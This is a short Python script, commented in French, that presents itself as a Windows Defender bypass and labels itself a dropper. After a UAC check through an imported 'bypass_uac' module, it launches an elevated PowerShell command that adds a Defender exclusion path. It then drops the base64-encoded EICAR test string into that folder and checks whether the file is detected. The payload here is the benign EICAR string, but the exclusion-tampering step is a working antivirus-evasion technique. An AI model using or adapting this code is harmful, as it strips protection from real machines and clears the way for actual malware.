#Permet de bypass Windows defender

#DROPER
#HARM
import time
import base64
import os
import bypass_uac

def eicar_test():
    global completeName
    global save_path
    global file_name
    save_path = 'C:\\Users\\Clément\\Desktop\\malware'
    file_name = "eicar.txt"

    completeName = os.path.join(save_path, file_name)
    print(completeName)
    b64_eicar = "WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo="
    with open(completeName, 'w') as f:
        f.write(base64.b64decode(b64_eicar).decode('utf-8'))
    wait_and_detect_eicar()



def wait_and_detect_eicar():
    #if ecair.txt exist return true
    time.sleep(5)
    try :
        with open(completeName) as f:
            f.read()
        print(u"Pas detecté")
        return True
    except :
        print("Detecté")
        return False


def main():
    if bypass_uac.detect_uac():
        user = os.environ["username"]
        os.popen(f""" powershell -Command Start-Process powershell -Verb runas 'Add-MpPreference -ExclusionPath "C:\\Users\\{user}\\Desktop\\malware\\eicar.txt"' """)
        eicar_test()
        print("Super ca marche")
        return True
    else:
        print("Erreur")
        return False

main()
